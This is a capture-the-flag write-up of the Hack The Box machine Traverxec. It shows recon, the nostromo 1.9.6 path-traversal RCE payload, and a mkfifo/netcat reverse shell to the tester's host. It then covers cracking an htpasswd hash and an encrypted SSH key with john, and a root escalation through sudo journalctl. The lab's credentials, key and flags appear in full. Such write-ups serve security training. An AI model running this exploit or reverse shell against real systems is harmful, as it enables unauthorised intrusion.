![[Pasted image 20210801105407.png]]

Starting with an nmap scan reveals port 80 and 22 open:
```
# Nmap 7.91 scan initiated Sun Aug  1 11:09:51 2021 as: nmap -p- --min-rate 1000 -v -sV -oA logs/tcp-extended -Pn -v 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up, received user-set (0.014s latency).
Scanned at 2021-08-01 11:09:51 AEST for 110s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 11:11:41 2021 -- 1 IP address (1 host up) scanned in 110.20 seconds
```

Retrieving a 404 page http://10.10.10.165/robots.txt reveals the server type and version:

![[Pasted image 20210801111011.png]]

We use searchsploit to search for vulnerabilities for that web server and find that it has an rce for that specific version:
```
% searchsploit nostromo
------------------------ ---------------------------------
 Exploit Title          |  Path
------------------------ ---------------------------------
Nostromo - Directory Tr | multiple/remote/47573.rb
nostromo 1.9.6 - Remote | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - | linux/remote/35466.sh
------------------------ ---------------------------------
Shellcodes: No Results
```

We copy the exploit and review it:
```
% searchsploit -m 47837
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/lo/oscp/notes/htb/traverxec/47837.py

```

It seems to be a simple path traversal to bin sh and the command is in the post data. Dead simple, yet great exploit:
```
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
```

We validate the exploit works by running it and getting the user:
```
% python 47837.py 10.10.10.165 80 whoami


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Sun, 01 Aug 2021 01:16:32 GMT
Server: nostromo 1.9.6
Connection: close


www-data

```

We trigger a reverse shell to get access on the box:
```
% python 47837.py 10.10.10.165 80 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 80 >/tmp/f'


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

```

And we are now on the box as the www-data user:
```
% sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.165] 40448
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$

www-data@traverxec:/usr/bin$ whoami
whoami
www-data
```

We do some quick recon on the box and find the nostromo config files which links to a password file:
```
www-data@traverxec:/var/nostromo$ ls
ls
conf  htdocs  icons  logs
www-data@traverxec:/var/nostromo$ cd conf
cd conf
www-data@traverxec:/var/nostromo/conf$ ls
ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

From the .htpasswd file we find david's hash and can use `john` to crack it:
```
% john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 19.38% (ETA: 13:42:54) 0g/s 246956p/s 246956c/s 246956C/s uladech2491987..ukrainemartynia
0g 0:00:00:30 46.14% (ETA: 13:42:57) 0g/s 220288p/s 220288c/s 220288C/s karlaykelly100%..karlanga817
Nowonly4me       (david)
1g 0:00:00:50 DONE (2021-08-01 13:42) 0.01989g/s 210470p/s 210470c/s 210470C/s NsNsNs..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The config file also suggests there may be a `public_www` somewhere in HOMEDIRS, however I was unsure where it was since it couldnt find it and didnt have access to `david` user. 
Based on documentation (http://www.nazgul.ch/dev/nostromo_man.html) it seems like the content of the homedirs can be access from the web:
```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.

     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

We can access david's public dir using the following url:
http://traverxec.htb/~david/

![[Pasted image 20210801145724.png]]

However, this doens't expose anything but this confirm that HOMEDIRS is working as expected and that the `david` user is exposing a `public_www` folder. So we can try to access his folder from cli:
```
www-data@traverxec:/tmp$ cd /home
cd /home
www-data@traverxec:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
www-data@traverxec:/home$ cd david/public_www
cd david/public_www
```

It works and in it we find a protected-file-area directory which contains a backup:
```
www-data@traverxec:/home/david/public_www$ ls
ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```

We can copy the backup to `/tmp` and extract it to find an id_rsa private key:
```
www-data@traverxec:/home/david/public_www/protected-file-area$ cp backup-ssh-identity-files.tgz /tmp
<ed-file-area$ cp backup-ssh-identity-files.tgz /tmp
www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp
cd /tmp
www-data@traverxec:/tmp$ ls
ls
backup-ssh-identity-files.tgz
f
lin.log
linpeas.sh
pspy.log
pspy64
systemd-private-790583806eca4fadbe7666da6a2d9ab8-systemd-timesyncd.service-0Vs4PU
vmware-root
vmware-root_569-4256610567
www-data@traverxec:/tmp$ tar zxvf backup*
tar zxvf backup*
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

We export the id_rsa file onto our host and save it to asdf_rsa:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----

```

The key appears to be encrypted. The password retrieved earlier does not allow us to decrypt it so now we can try to bruteforce the hash using john.

We first convert the hash to the correct format using `ssh2john.py`:
```
% /usr/share/john/ssh2john.py asdf_rsa
asdf_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
```

We save the hash to hash.txt and run john with rockyou:
```
% john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (asdf_rsa)
1g 0:00:00:02 DONE (2021-08-01 14:27) 0.3389g/s 4861Kp/s 4861Kc/s 4861KC/s     1990..*7¡Vamos!
Session completed
```

This cracks the password pretty much instantely and we now have the ssh private key credentials and can login as david:
```
% ssh david@$IP -i asdf_rsa
Enter passphrase for key 'asdf_rsa':
X11 forwarding request failed on channel 1
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```


Privesc to root is relatively quick, we try `sudo -l` first as always but this requires a password. Trying to use the previously cracked pass doesnt work.
```
david@traverxec:~$ sudo -l
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
^Csudo: 2 incorrect password attempts
```

In david's home directory there is a bin folder and inside we can see a server-stats.sh program which prints program stats on execution:
```
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cd bin/
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
david@traverxec:~/bin$ ./server-stats.sh
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

Load:  00:30:31 up 30 min,  1 user,  load average: 0.00, 0.00, 0.00

Open nhttpd sockets: 3
Files in the docroot: 117

Last 5 journal log lines:
-- Logs begin at Sun 2021-08-01 00:00:09 EDT, end at Sun 2021-08-01 00:30:31 EDT. --
Aug 01 00:08:06 traverxec sudo[3715]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost=  user=www-data
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): conversation failed
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Aug 01 00:08:08 traverxec sudo[3715]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
Aug 01 00:08:08 traverxec nologin[3767]: Attempted login by UNKNOWN on UNKNOWN
```

We have read permission so can cat the program and we see that the last command is running with sudo:
```
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Therefore we can assume that david has sudo permissions on that command, which we can verify by simply running the command
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-08-01 00:00:09 EDT, end at Sun 2021-08-01 00:31:42 EDT. --
Aug 01 00:08:06 traverxec sudo[3715]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pt
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): conversation failed
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Aug 01 00:08:08 traverxec sudo[3715]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=lis
Aug 01 00:08:08 traverxec nologin[3767]: Attempted login by UNKNOWN on UNKNOWN
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-08-01 00:00:09 EDT, end at Sun 2021-08-01 00:32:09 EDT. --
Aug 01 00:08:06 traverxec sudo[3715]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pt
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): conversation failed
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Aug 01 00:08:08 traverxec sudo[3715]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=lis
Aug 01 00:08:08 traverxec nologin[3767]: Attempted login by UNKNOWN on UNKNOWN
```

Using gtfobins we can see that `journalctl` can be exploit since it will invoke the default default pager, which is likely to be `less`.  We can therefore use this go gain root on the box:
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-08-01 00:00:09 EDT, end at Sun 2021-08-01 00:32:50 EDT. --
Aug 01 00:08:06 traverxec sudo[3715]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pt
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): conversation failed
Aug 01 00:08:08 traverxec sudo[3715]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Aug 01 00:08:08 traverxec sudo[3715]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=lis
Aug 01 00:08:08 traverxec nologin[3767]: Attempted login by UNKNOWN on UNKNOWN
!/bin/sh
# whoami
root
# cd /root
# ls
nostromo_1.9.6-1.deb  root.txt
# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
```